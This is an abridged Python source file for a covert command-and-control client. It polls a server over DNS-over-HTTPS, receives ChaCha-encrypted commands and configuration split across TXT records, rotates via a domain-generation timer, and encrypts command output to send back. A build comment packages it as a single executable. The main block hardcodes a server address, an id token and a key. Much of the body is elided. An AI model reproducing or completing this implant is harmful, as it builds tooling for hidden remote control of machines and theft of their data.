# pyinstaller --onefile DOH_CHACHA.py
...
class ChaChaCipher_string:
    ...
    def decrypt(self, enc_data):
        ...
        encrypted_data = b64decode(enc_data)
...
class DOH_Client:
    def __init__(self, server_url, id_token, chacha_key, user_agent=None, uris=None, dga_timer=300):
        self.server_url = server_url.rstrip("/")
        self.id_token = id_token.strip().lower()
        self.chacha_cipher = ChaChaCipher_string(chacha_key)
    ...
    def is_spoof_txt(self, txt):
        txt_lower = txt.lower()
        if any(txt_lower.startswith(p) for p in ["enc:", "i=", "cb:", "cmd_info:", "cmd_complete:", "dga=", "cfg:"]):
            return False
    ...
    def parse_init_payload(self, txt):
        try:
            if txt.startswith("ENC:"):
                encrypted_b64 = txt[4:]
                txt = self.chacha_cipher.decrypt(encrypted_b64)
    ...
    def parse_config_part(self, txt):
        try:
            ...
            if cfg_data['received_count'] == cfg_data['total']:
                ...
                decrypted_config = self.chacha_cipher.decrypt(full_encrypted_b64)
        ...
        try:
            ...
            if checksum in self.command_parts:
                ...
                if cmd_data['received_count'] == cmd_data['total']:
                    ...
                    try:
                        full_encrypted_b64 = b64decode(full_encoded).decode('utf-8')
                        full_command = self.chacha_cipher.decrypt(full_encrypted_b64)
    ...
    def send_output(self, output):
        ...
        try:
            encrypted_output = self.chacha_cipher.encrypt(output)
...
if __name__ == "__main__":
    server_url = "https://192.168.1.107:7777"
    id_token = "8c189ebc-6799-4530-bdc7-2229e7cf6985"
    chacha_key = "12345678901234567890123456789012"
    
    client = DOH_Client(server_url, id_token, chacha_key, dga_timer=5)
    client.run()
